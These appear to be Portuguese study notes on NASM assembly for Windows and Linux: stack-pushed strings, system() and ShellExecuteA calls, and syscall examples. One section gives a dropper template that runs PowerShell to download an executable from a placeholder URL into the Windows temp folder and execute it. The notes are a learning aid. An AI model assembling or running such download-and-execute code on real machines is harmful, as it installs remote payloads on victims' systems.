# Syntax Intel vs AT&T

![Diferença de Syntax](Syntax.png)

# Instruções

![Instruções](Instrucoes.png)

# Windows

## Instruções
Os comandos devem ser enviado a stack alinhados de 4 em 4 bytes ,por exemplo 63616c632e657865 ficaria 63 61 6c 63 / 65 78 65 00, e pelo push de forma invertida e com 00 no final para o programa saber que acabou. 
Exemplo: cmd.exe00 → 00exe.cmd, em hex 63 6D 64 2E 65 78 65 → 00657865 2E646D63

---

Sempre verificar os parâmetros da função e enviar ao contrário os argumentos

---
Como compilar: 
``nasm -f win32 <file.asm>``
``golink /entry _main <file.obj> <dll> ``

---
Para pesquisar:
Forma básica: ``arwin <dll name> <function name>``

---
## Exemplos
### Cmd 
```nasm
extern system
global _main

section .text ;Define a sessão de código
_main: ;Define a main

	push 0x00657865 ;00exe
	push 0x2e646d63 ;.cmd
	push esp
	pop eax
	push eax
	mov ebx, 0x76453dc0 ;Chama o system
	call ebx
```
### Compilando
- nasm -f win32 file.asm
- golink /entry _ main file.obj msvcrt.dll
---
### Caixa de texto
```nasm
extern _MessageBoxA
global _main

section .data
	msg db "<msg>",0
	title db "<title>",0

section .text
_main:
	push 0
	push title
	push msg
	push 0
	call _MessageBoxA
```
### Compilando
- nasm -f win32 file.asm
- golink /entry _ main file.obj User32.dll /mix
---
### Execução de comandos no cmd
```nasm
extern _ShellExecuteA
global _main

section .data
	type db "open",0
	cmd db "cmd",0
	par db "/c <command>",0

section .text
_main:
	push 0
	push 0
	push par
	push cmd
	push type
	push 0
	call _ShellExecuteA
```
### Compilando
- nasm -f win32 file.asm
- golink /entry _ main file.obj Shell32.dll /mix
---
### Download por cmd
```nasm
extern _ShellExecuteA
global _main

section .data
	type db "open",0
	cmd db "cmd",0
	par db "/c  powershell -Command wget '<url.exe>' -OutFile <dir.exe> ; <dir.exe>, 0

section .text
_main:
	push 0
	push 0
	push par
	push cmd
	push type
	push 0
	call _ShellExecuteA
```
### Diretório Recomendado
- Diretório temporário do Windows -> c:\windows\temp\

### Compilando
- nasm -f win32 file.asm
- golink /console /entry _ main file.obj User32.dll /mix
---
# Linux
## Instruções

Como compilar em x86: 
``nasm -f elf32 <file.asm> ld --entry main <file.o> -m elf_i386 -o <output file>``

---
Como compilar em x64: 
``nasm -f elf64 <file.asm> ld --entry _main <file.o> -o <output file>``

---
## Sites Úteis
[https://syscalls.w3challs.com/?arch=x86](https://syscalls.w3challs.com/?arch=x86)

[https://syscalls.w3challs.com/?arch=x86_64](https://syscalls.w3challs.com/?arch=x86_64)

[https://asciitohex.com](https://asciitohex.com)


---
## Exemplos
### Texto no bash x86
```nasm
global _main

section  .data
	<text>: db '<text>'0xa

section .text
_main:
	mov eax, 4
	mov ebx, 1; STDIN0, STDOUT1, STDERR2
	mov ecx, <text>
	mov edx, <size>
	int 0x80

	mov eax, 1
	mov ebx, 0
int 0x80
```
---
### Texto no bash x64
```nasm
global _main

section  .data
	<text>: db '<text>'0xa

section .text
_main:
	mov rax, 1
	mov rdi, 1; STDIN0, STDOUT1, STDERR2
	mov rsi, <text>
	mov rdx, <size>
	syscall

	mov rax, 60
	mov rdi, 0
	syscall
```
